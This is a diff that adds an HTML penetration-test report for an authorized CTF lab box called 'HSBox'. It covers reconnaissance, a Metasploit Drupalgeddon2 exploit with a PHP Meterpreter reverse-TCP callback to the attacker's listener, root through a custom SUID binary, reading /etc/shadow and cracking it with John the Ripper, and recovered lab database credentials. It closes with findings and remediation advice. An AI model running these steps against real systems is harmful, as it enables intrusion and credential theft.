@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<title>HSBox Penetration Test Report</title>
+
+
+
+<style>
+
+body {
+
+    font-family: Arial, Helvetica, sans-serif;
+
+    background: white;
+
+    color: #222;
+
+    margin: 0;
+
+    padding: 20px 6%;
+
+}
+
+
+
+h1 {
+
+    background: #32104f;
+
+    color: white;
+
+    padding: 14px;
+
+    font-size: 22px;
+
+}
+
+
+
+h2 {
+
+    background: #eaf4fb;
+
+    padding: 9px;
+
+    border-left: 5px solid #32104f;
+
+}
+
+
+
+.target {
+
+    background: #c8ffc8;
+
+    padding: 12px;
+
+    font-size: 18px;
+
+    font-weight: bold;
+
+}
+
+
+
+table {
+
+    border-collapse: collapse;
+
+    width: 100%;
+
+    margin: 15px 0;
+
+}
+
+
+
+th, td {
+
+    border: 1px solid #999;
+
+    padding: 8px;
+
+    text-align: left;
+
+}
+
+
+
+th {
+
+    background: #d9e8d9;
+
+}
+
+
+
+pre {
+
+    background: #f2f2f2;
+
+    border: 1px solid #ccc;
+
+    padding: 12px;
+
+    overflow-x: auto;
+
+}
+
+
+
+.critical {
+
+    background: #ffb3b3;
+
+    font-weight: bold;
+
+}
+
+
+
+.high {
+
+    background: #ffd0a8;
+
+    font-weight: bold;
+
+}
+
+
+
+.success {
+
+    color: green;
+
+    font-weight: bold;
+
+}
+
+</style>
+
+</head>
+
+
+
+<body>
+
+
+
+<h1>HSBox Penetration Testing Report</h1>
+
+
+
+<div class="target">
+
+Assessment Target: 10.0.1.8
+
+</div>
+
+
+
+<p><b>Attacker Machine:</b> Parrot Security OS</p>
+
+<p><b>Attacker IP:</b> 10.0.1.4</p>
+
+<p><b>Assessment Type:</b> Authorized CTF / Security Lab</p>
+
+
+
+<h2>1. Reconnaissance</h2>
+
+
+
+<p>The target was enumerated from the Parrot attacker machine.</p>
+
+
+
+<pre>
+
+nmap -sC -sV 10.0.1.8
+
+</pre>
+
+
+
+<table>
+
+<tr>
+
+<th>Port</th>
+
+<th>Service</th>
+
+<th>Observation</th>
+
+</tr>
+
+
+
+<tr>
+
+<td>80/tcp</td>
+
+<td>HTTP</td>
+
+<td>Drupal 7.0 web application</td>
+
+</tr>
+
+
+
+<tr>
+
+<td>6880/tcp</td>
+
+<td>FTP</td>
+
+<td>Anonymous FTP access</td>
+
+</tr>
+
+</table>
+
+
+
+<h2>2. Anonymous FTP Enumeration</h2>
+
+
+
+<p>
+
+Anonymous FTP access was identified. The exposed files were enumerated and
+
+a packet capture was obtained for analysis.
+
+</p>
+
+
+
+<pre>
+
+ftp 10.0.1.8
+
+</pre>
+
+
+
+<p><b>Recovered file:</b> network_capture.pcap</p>
+
+
+
+<h2>3. HTTP / Drupal Enumeration</h2>
+
+
+
+<p>
+
+The HTTP service hosted a Drupal 7.0 installation.
+
+The Drupal CHANGELOG confirmed the old 7.0 release.
+
+</p>
+
+
+
+<pre>
+
+curl -s http://10.0.1.8/
+
+</pre>
+
+
+
+<p>
+
+The Drupal installation was identified as vulnerable to the
+
+HTTP Drupalgeddon vulnerability used in the lab.
+
+</p>
+
+
+
+<h2>4. HTTP Drupalgeddon Exploitation</h2>
+
+
+
+<p>
+
+Metasploit was used to exploit the vulnerable Drupal HTTP service.
+
+The successful payload configuration used a PHP Meterpreter Reverse TCP
+
+payload.
+
+</p>
+
+
+
+<pre>
+
+use exploit/unix/webapp/drupal_drupalgeddon2
+
+
+
+set RHOSTS 10.0.1.8
+
+set RPORT 80
+
+set TARGETURI /
+
+
+
+set LHOST 10.0.1.4
+
+set LPORT 4444
+
+
+
+set payload php/meterpreter/reverse_tcp
+
+
+
+run
+
+</pre>
+
+
+
+<p>
+
+The module reported:
+
+</p>
+
+
+
+<pre>
+
+[+] The target appears to be vulnerable.
+
+</pre>
+
+
+
+<table>
+
+<tr>
+
+<th>Exploit</th>
+
+<th>Payload</th>
+
+<th>Listener</th>
+
+</tr>
+
+
+
+<tr>
+
+<td>HTTP Drupalgeddon</td>
+
+<td>php/meterpreter/reverse_tcp</td>
+
+<td>10.0.1.4:4444</td>
+
+</tr>
+
+</table>
+
+
+
+<h2>5. Initial Access</h2>
+
+
+
+<p>
+
+A reverse TCP connection was successfully received from the target.
+
+</p>
+
+
+
+<pre>
+
+connect to [10.0.1.4] from (UNKNOWN) [10.0.1.8] 39325
+
+</pre>
+
+
+
+<p>
+
+The compromised Drupal/web-server process was running as:
+
+</p>
+
+
+
+<pre>
+
+www-data
+
+</pre>
+
+
+
+<p class="success">
+
+Initial access as www-data was successfully obtained.
+
+</p>
+
+
+
+<h2>6. Local Enumeration</h2>
+
+
+
+<p>
+
+Filesystem enumeration was performed to locate challenge flags.
+
+</p>
+
+
+
+<pre>
+
+find / -type f -iname '*flag*' 2>/dev/null
+
+</pre>
+
+
+
+<table>
+
+<tr>
+
+<th>Flag</th>
+
+<th>Location</th>
+
+<th>Status</th>
+
+</tr>
+
+
+
+<tr>
+
+<td>Flag 1</td>
+
+<td>/home/jack/flag1.txt</td>
+
+<td>Recovered</td>
+
+</tr>
+
+
+
+<tr>
+
+<td>Flag 2</td>
+
+<td>/home/harry/flag2.txt</td>
+
+<td>Located</td>
+
+</tr>
+
+
+
+<tr>
+
+<td>Final Flag</td>
+
+<td>/root/finalflag.txt</td>
+
+<td>Located</td>
+
+</tr>
+
+</table>
+
+
+
+<h2>7. Recovered Flag 1</h2>
+
+
+
+<pre>
+
+flag1{08d654b2513615d30fe80f8a36e6425c}
+
+</pre>
+
+
+
+<h2>8. SUID Enumeration</h2>
+
+
+
+<p>
+
+SUID binaries were enumerated for local privilege escalation.
+
+</p>
+
+
+
+<pre>
+
+find / -perm -4000 -type f 2>/dev/null
+
+</pre>
+
+
+
+<p>
+
+A custom SUID executable was discovered:
+
+</p>
+
+
+
+<pre>
+
+/usr/bin/What_are/you/_searching_/for?/iamhere
+
+</pre>
+
+
+
+<p>
+
+Inspection of the binary revealed references to:
+
+</p>
+
+
+
+<pre>
+
+setuid
+
+system
+
+/bin/bash
+
+</pre>
+
+
+
+<p>
+
+The binary also contained the following strings:
+
+</p>
+
+
+
+<pre>
+
+Wanna become root user on this machine?
+
+let me think.....
+
+Ok here you go
+
+</pre>
+
+
+
+<h2>9. Privilege Escalation</h2>
+
+
+
+<table>
+
+<tr>
+
+<th>Stage</th>
+
+<th>User</th>
+
+</tr>
+
+
+
+<tr>
+
+<td>Initial access</td>
+
+<td>www-data</td>
+
+</tr>
+
+
+
+<tr>
+
+<td>Privilege escalation</td>
+
+<td>root</td>
+
+</tr>
+
+</table>
+
+
+
+<p class="success">
+
+Root privileges were successfully obtained through the custom SUID binary.
+
+</p>
+
+
+
+<h2>10. Linux User Enumeration</h2>
+
+
+
+<pre>
+
+cat /etc/passwd
+
+</pre>
+
+
+
+<table>
+
+<tr>
+
+<th>UID</th>
+
+<th>User</th>
+
+<th>Home Directory</th>
+
+<th>Shell</th>
+
+</tr>
+
+
+
+<tr>
+
+<td>1000</td>
+
+<td>jack</td>
+
+<td>/home/jack</td>
+
+<td>/bin/bash</td>
+
+</tr>
+
+
+
+<tr>
+
+<td>1001</td>
+
+<td>harry</td>
+
+<td>/home/harry</td>
+
+<td>/bin/bash</td>
+
+</tr>
+
+</table>
+
+
+
+<h2>11. Password Hash Enumeration</h2>
+
+
+
+<p>
+
+After obtaining root access, Linux password hashes were inspected.
+
+</p>
+
+
+
+<pre>
+
+cat /etc/shadow
+
+</pre>
+
+
+
+<p>
+
+John the Ripper was used for password recovery:
+
+</p>
+
+
+
+<pre>
+
+john hashes.txt
+
+john --show hashes.txt
+
+</pre>
+
+
+
+<p>
+
+Jack's password was recovered:
+
+</p>
+
+
+
+<pre>
+
+jack:kcaj
+
+</pre>
+
+
+
+<p>
+
+Harry's SHA-512-crypt hash was submitted to John the Ripper using
+
+the RockYou wordlist for further password recovery.
+
+</p>
+
+
+
+<h2>12. Drupal Database Configuration</h2>
+
+
+
+<p>
+
+Drupal's database configuration was located at:
+
+</p>
+
+
+
+<pre>
+
+/var/www/html/sites/default/settings.php
+
+</pre>
+
+
+
+<p>
+
+The following database credentials were identified:
+
+</p>
+
+
+
+<pre>
+
+database = pumpkins
+
+username = admin
+
+password = admin@123
+
+host = localhost
+
+driver = mysql
+
+</pre>
+
+
+
+<h2>13. Sudoers Enumeration</h2>
+
+
+
+<p>
+
+The sudo configuration was inspected:
+
+</p>
+
+
+
+<pre>
+
+cat /etc/sudoers
+
+</pre>
+
+
+
+<p>
+
+Relevant entries were:
+
+</p>
+
+
+
+<pre>
+
+root    ALL=(ALL:ALL) ALL
+
+
+
+jack    ALL=(harry) NOPASSWD: /usr/bin/awk
+
+
+
+www-data ALL=(harry) NOPASSWD: /usr/bin/find
+
+
+
+%admin ALL=(ALL) ALL
+
+
+
+%sudo ALL=(ALL:ALL) ALL
+
+</pre>
+
+
+
+<table>
+
+<tr>
+
+<th>Principal</th>
+
+<th>Permission</th>
+
+<th>Risk</th>
+
+</tr>
+
+
+
+<tr>
+
+<td>jack</td>
+
+<td>Run /usr/bin/awk as harry without password</td>
+
+<td class="high">HIGH</td>
+
+</tr>
+
+
+
+<tr>
+
+<td>www-data</td>
+
+<td>Run /usr/bin/find as harry without password</td>
+
+<td class="high">HIGH</td>
+
+</tr>
+
+
+
+<tr>
+
+<td>%admin</td>
+
+<td>ALL commands</td>
+
+<td class="critical">CRITICAL</td>
+
+</tr>
+
+
+
+<tr>
+
+<td>%sudo</td>
+
+<td>ALL commands</td>
+
+<td class="critical">CRITICAL</td>
+
+</tr>
+
+
+
+</table>
+
+
+
+<h2>14. Attack Path</h2>
+
+
+
+<pre>
+
+10.0.1.8
+
+   |
+
+   +-- HTTP / Drupal 7.0
+
+   |       |
+
+   |       +-- HTTP Drupalgeddon
+
+   |               |
+
+   |               +-- PHP Meterpreter Reverse TCP
+
+   |                       |
+
+   |                       +-- www-data
+
+   |
+
+   +-- Anonymous FTP
+
+   |       |
+
+   |       +-- network_capture.pcap
+
+   |
+
+   +-- Local Enumeration
+
+           |
+
+           +-- SUID Binary
+
+                   |
+
+                   +-- root
+
+                         |
+
+                         +-- Flags
+
+                         +-- Password Hashes
+
+                         +-- Sudoers
+
+</pre>
+
+
+
+<h2>15. Security Findings</h2>
+
+
+
+<table>
+
+<tr>
+
+<th>Severity</th>
+
+<th>Finding</th>
+
+<th>Impact</th>
+
+</tr>
+
+
+
+<tr>
+
+<td class="critical">CRITICAL</td>
+
+<td>HTTP Drupal remote code execution</td>
+
+<td>Remote compromise of the web application</td>
+
+</tr>
+
+
+
+<tr>
+
+<td class="critical">CRITICAL</td>
+
+<td>Custom SUID binary</td>
+
+<td>Privilege escalation to root</td>
+
+</tr>
+
+
+
+<tr>
+
+<td class="high">HIGH</td>
+
+<td>Anonymous FTP access</td>
+
+<td>Information disclosure</td>
+
+</tr>
+
+
+
+<tr>
+
+<td class="high">HIGH</td>
+
+<td>Weak Jack password</td>
+
+<td>Account compromise</td>
+
+</tr>
+
+
+
+<tr>
+
+<td class="high">HIGH</td>
+
+<td>Permissive NOPASSWD sudo rules</td>
+
+<td>User-to-user privilege escalation</td>
+
+</tr>
+
+
+
+<tr>
+
+<td class="high">HIGH</td>
+
+<td>Database credentials in settings.php</td>
+
+<td>Credential disclosure</td>
+
+</tr>
+
+
+
+</table>
+
+
+
+<h2>16. Recommendations</h2>
+
+
+
+<ul>
+
+<li>Upgrade the Drupal installation and apply current security patches.</li>
+
+<li>Disable anonymous FTP access unless explicitly required.</li>
+
+<li>Restrict access to packet captures and sensitive files.</li>
+
+<li>Rotate all credentials discovered during the assessment.</li>
+
+<li>Remove unnecessary SUID permissions.</li>
+
+<li>Audit custom SUID executables before granting elevated privileges.</li>
+
+<li>Replace weak passwords with strong unique credentials.</li>
+
+<li>Review NOPASSWD sudo rules and apply least privilege.</li>
+
+<li>Protect Drupal configuration files and database credentials.</li>
+
+</ul>
+
+
+
+<h2>17. Conclusion</h2>
+
+
+
+<p>
+
+The HSBox assessment demonstrated an attack path beginning with
+
+service enumeration and exposed FTP access, followed by exploitation
+
+of the HTTP Drupal installation using the Drupalgeddon exploit and
+
+a PHP Meterpreter Reverse TCP payload.
+
+</p>
+
+
+
+<p>
+
+Initial access was obtained as <b>www-data</b>, followed by local
+
+enumeration and privilege escalation through a custom SUID executable.
+
+Root access enabled further flag, credential, and sudo configuration
+
+enumeration.
+
+</p>
+
+
+
+<p class="success">
+
+<b>Assessment completed in the authorized HSBox lab environment.</b>
+
+</p>
+
+
+
+</body>
+
+</html>
